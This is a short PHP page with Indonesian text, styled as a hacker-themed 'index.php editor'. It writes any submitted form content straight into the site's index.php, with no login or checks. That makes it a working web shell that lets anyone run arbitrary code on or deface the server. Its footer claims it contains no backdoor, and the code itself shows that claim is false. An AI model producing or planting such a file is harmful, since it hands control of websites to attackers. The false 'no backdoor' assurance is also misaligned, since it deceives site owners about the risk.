<?php
// index.edit.php - Satu file untuk edit index.php
if($_POST['code']) {
    file_put_contents('index.php', $_POST['code']);
    $msg = "✅ index.php berhasil diupdate!";
}
$current = file_exists('index.php') ? htmlspecialchars(file_get_contents('index.php')) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Edit Index</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 30px; }
        textarea { width: 100%; height: 500px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 15px; font-size: 14px; }
        button { background: #0f0; color: #000; border: 0; padding: 15px 30px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background: #00ff00; }
        .msg { background: #003300; padding: 15px; margin: 20px 0; border-left: 5px solid #0f0; }
    </style>
</head>
<body>
    <h1>⚡ INDEX.PHP EDITOR - FOR YANG MULIA ⚡</h1>
    
    <?php if($msg): ?>
        <div class="msg"><?php echo $msg; ?></div>
    <?php endif; ?>
    
    <form method="post">
        <textarea name="code" placeholder="Tulis kode PHP/HTML di sini..."><?php echo $current; ?></textarea>
        <br><br>
        <button type="submit">💾 SIMPAN PERUBAHAN INDEX.PHP</button>
    </form>
    
    <div style="margin-top: 30px; color: #666; border-top: 1px solid #333; padding-top: 20px;">
        <p>📌 Tip: File index.php akan langsung berubah setelah klik simpan.</p>
        <p>🔒 Tidak ada backdoor, murni file editor sederhana.</p>
    </div>
</body>
</html>
